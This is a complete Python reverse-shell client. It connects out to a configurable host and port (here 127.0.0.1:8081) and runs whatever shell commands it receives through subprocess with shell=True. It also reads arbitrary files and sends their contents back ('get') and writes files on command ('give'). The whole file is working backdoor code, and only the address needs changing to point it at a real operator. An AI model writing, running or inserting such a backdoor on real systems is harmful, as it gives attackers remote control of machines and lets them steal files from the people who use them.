import socket
import subprocess
import os

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

#client.close()

def command_handler(command :str) -> str:
    command_args = command.split(' ')
    command_args_len = len(command_args)
    try:
        if 'cd' in command_args[0]:
            if (command_args_len > 1):
                os.chdir(command_args[1])
                return f"Changed directory to {os.getcwd()}\n"
            return '\n'

        if 'get' in command_args[0]:
            if(command_args_len > 1):
                with open(command_args[1], 'r') as file:
                    return file.read()
            return "\n"

        if 'give' in command_args[0]:
            if(command_args_len > 1):
                with open(command_args[1], 'w') as file:
                    file.write(command_args[2])
            return "\n"

        else:
            result = subprocess.run(command, shell=True, capture_output=True)
            return result.stdout.decode()

    except Exception as e:
        print(e)
        return str(e) + '\n'

def close_command():
    global client
    client.close()


def check_close(command :str):
    command_args = command.split(' ')
    if 'ccon' in command_args:
        close_command()


while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    check_close(command)
    client.send(command_handler(command).encode())
    print("[-] Sending response...")
    